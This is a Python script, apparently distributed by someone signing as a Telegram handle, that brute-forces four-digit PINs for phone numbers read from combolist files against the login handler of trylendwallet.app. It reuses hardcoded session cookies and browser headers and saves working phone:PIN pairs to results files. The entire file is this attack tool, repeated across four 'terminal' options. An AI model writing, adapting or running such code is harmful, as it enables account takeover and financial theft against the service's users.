from os import P_NOWAIT
import requests
import random

print("""
 _       ___    ____  ____   __    __   ____  _      _     
| |     /   \  /    ||    \ |  |__|  | /    || |    | |    
| |    |     ||  o  ||  _  ||  |  |  ||  o  || |    | |    
| |___ |  O  ||     ||  |  ||  |  |  ||     || |___ | |___ 
|     ||     ||  _  ||  |  ||  `  '  ||  _  ||     ||     |
|     ||     ||  |  ||  |  | \      / |  |  ||     ||     |
|_____| \___/ |__|__||__|__|  \_/\_/  |__|__||_____||_____|
CREATOR> TELEGRAM: @D R O P H A C K 6 6 6                                           
""")

print("You have 4 terminals available. (1), (2), (3), (4)")
START = input("Enter the terminal you want to start:")

if START == "1":
    print("TERMINAL #1")
    with open("combolist1.txt") as f:
        for line in f:
            line = line.replace("\n","")
            USER = line
            NUM = []
            for i in range(10000):
                try:
                    one = str(random.randint(0,9))
                    two = str(random.randint(0,9))
                    three = str(random.randint(0,9))
                    four = str(random.randint(0,9))
                    PIN = one+two+three+four
                    if PIN not in NUM:
                        NUM.append(PIN)

                        header={"authority": "trylendwallet.app",
                        "method": "POST",
                        "path": "/handlers/login",
                        "scheme": "https",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9,es;q=0.8",
                        "cache-control": "max-age=0",
                        "content-length": "55",
                        "content-type": "application/x-www-form-urlencoded",
                        "cookie": "lsdata=df898e7d-1b04-4091-92ef-98d47194c220; laravel_session=5e005c202c3c71b64fd1f6fd8dbbf115c5fdc89c; vnm=d026ecde-3183-469b-8a9d-b34f4d7a9022",
                        "origin": "https://trylendwallet.app",
                        "referer": "https://trylendwallet.app/login",
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                        "sec-ch-ua-mobile": "?0",
                        'sec-ch-ua-platform': '"Windows"',
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
                        }

                        auth={"_token": "",
                        "fcode": "",
                        "ssn": PIN,
                        "phone": USER,
                        "email": ""}

                        r = requests.post("https://trylendwallet.app/handlers/login",headers=header, data=auth)
                        print(r.text)
                        if "<h2>Welcome, <strong>!</strong>" in r.text:
                            print(PIN+" INVALID")
                        else:
                            with open("results1.txt","a+") as h4:
                                h4.write(USER+":"+PIN+"\n")
                                print(PIN+" VALID")
                                break
                    else:
                        pass
                except:
                    print("Oops an error has occurred!")
                    pass

if START == "2":
    print("TERMINAL #2")
    with open("combolist2.txt") as f:
        for line in f:
            line = line.replace("\n","")
            USER = line
            NUM = []
            for i in range(10000):
                try:
                    one = str(random.randint(0,9))
                    two = str(random.randint(0,9))
                    three = str(random.randint(0,9))
                    four = str(random.randint(0,9))
                    PIN = one+two+three+four
                    if PIN not in NUM:
                        NUM.append(PIN)

                        header={"authority": "trylendwallet.app",
                        "method": "POST",
                        "path": "/handlers/login",
                        "scheme": "https",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9,es;q=0.8",
                        "cache-control": "max-age=0",
                        "content-length": "55",
                        "content-type": "application/x-www-form-urlencoded",
                        "cookie": "lsdata=df898e7d-1b04-4091-92ef-98d47194c220; laravel_session=5e005c202c3c71b64fd1f6fd8dbbf115c5fdc89c; vnm=d026ecde-3183-469b-8a9d-b34f4d7a9022",
                        "origin": "https://trylendwallet.app",
                        "referer": "https://trylendwallet.app/login",
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                        "sec-ch-ua-mobile": "?0",
                        'sec-ch-ua-platform': '"Windows"',
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
                        }

                        auth={"_token": "",
                        "fcode": "",
                        "ssn": PIN,
                        "phone": USER,
                        "email": ""}

                        r = requests.post("https://trylendwallet.app/handlers/login",headers=header, data=auth)
                        print(r.text)
                        if "<h2>Welcome, <strong>!</strong>" in r.text:
                            print(PIN+" INVALID")
                        else:
                            with open("results2.txt","a+") as h4:
                                h4.write(USER+":"+PIN+"\n")
                                print(PIN+" VALID")
                                break
                    else:
                        pass
                except:
                    print("Oops an error has occurred!")
                    pass
if START == "3":
    print("TERMINAL #3")
    with open("combolist3.txt") as f:
        for line in f:
            line = line.replace("\n","")
            USER = line
            NUM = []
            for i in range(10000):
                try:
                    one = str(random.randint(0,9))
                    two = str(random.randint(0,9))
                    three = str(random.randint(0,9))
                    four = str(random.randint(0,9))
                    PIN = one+two+three+four
                    if PIN not in NUM:
                        NUM.append(PIN)

                        header={"authority": "trylendwallet.app",
                        "method": "POST",
                        "path": "/handlers/login",
                        "scheme": "https",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9,es;q=0.8",
                        "cache-control": "max-age=0",
                        "content-length": "55",
                        "content-type": "application/x-www-form-urlencoded",
                        "cookie": "lsdata=df898e7d-1b04-4091-92ef-98d47194c220; laravel_session=5e005c202c3c71b64fd1f6fd8dbbf115c5fdc89c; vnm=d026ecde-3183-469b-8a9d-b34f4d7a9022",
                        "origin": "https://trylendwallet.app",
                        "referer": "https://trylendwallet.app/login",
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                        "sec-ch-ua-mobile": "?0",
                        'sec-ch-ua-platform': '"Windows"',
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
                        }

                        auth={"_token": "",
                        "fcode": "",
                        "ssn": PIN,
                        "phone": USER,
                        "email": ""}

                        r = requests.post("https://trylendwallet.app/handlers/login",headers=header, data=auth)
                        print(r.text)
                        if "<h2>Welcome, <strong>!</strong>" in r.text:
                            print(PIN+" INVALID")
                        else:
                            with open("results3.txt","a+") as h4:
                                h4.write(USER+":"+PIN+"\n")
                                print(PIN+" VALID")
                                break
                    else:
                        pass
                except:
                    print("Oops an error has occurred!")
                    pass

if START == "4":
    print("TERMINAL #4")
    with open("combolist4.txt") as f:
        for line in f:
            line = line.replace("\n","")
            USER = line
            NUM = []
            for i in range(10000):
                try:
                    one = str(random.randint(0,9))
                    two = str(random.randint(0,9))
                    three = str(random.randint(0,9))
                    four = str(random.randint(0,9))
                    PIN = one+two+three+four
                    if PIN not in NUM:
                        NUM.append(PIN)

                        header={"authority": "trylendwallet.app",
                        "method": "POST",
                        "path": "/handlers/login",
                        "scheme": "https",
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "en-US,en;q=0.9,es;q=0.8",
                        "cache-control": "max-age=0",
                        "content-length": "55",
                        "content-type": "application/x-www-form-urlencoded",
                        "cookie": "lsdata=df898e7d-1b04-4091-92ef-98d47194c220; laravel_session=5e005c202c3c71b64fd1f6fd8dbbf115c5fdc89c; vnm=d026ecde-3183-469b-8a9d-b34f4d7a9022",
                        "origin": "https://trylendwallet.app",
                        "referer": "https://trylendwallet.app/login",
                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
                        "sec-ch-ua-mobile": "?0",
                        'sec-ch-ua-platform': '"Windows"',
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36"
                        }

                        auth={"_token": "",
                        "fcode": "",
                        "ssn": PIN,
                        "phone": USER,
                        "email": ""}

                        r = requests.post("https://trylendwallet.app/handlers/login",headers=header, data=auth)
                        print(r.text)
                        if "<h2>Welcome, <strong>!</strong>" in r.text:
                            print(PIN+" INVALID")
                        else:
                            with open("results4.txt","a+") as h4:
                                h4.write(USER+":"+PIN+"\n")
                                print(PIN+" VALID")
                                break
                    else:
                        pass
                except:
                    print("Oops an error has occurred!")
                    pass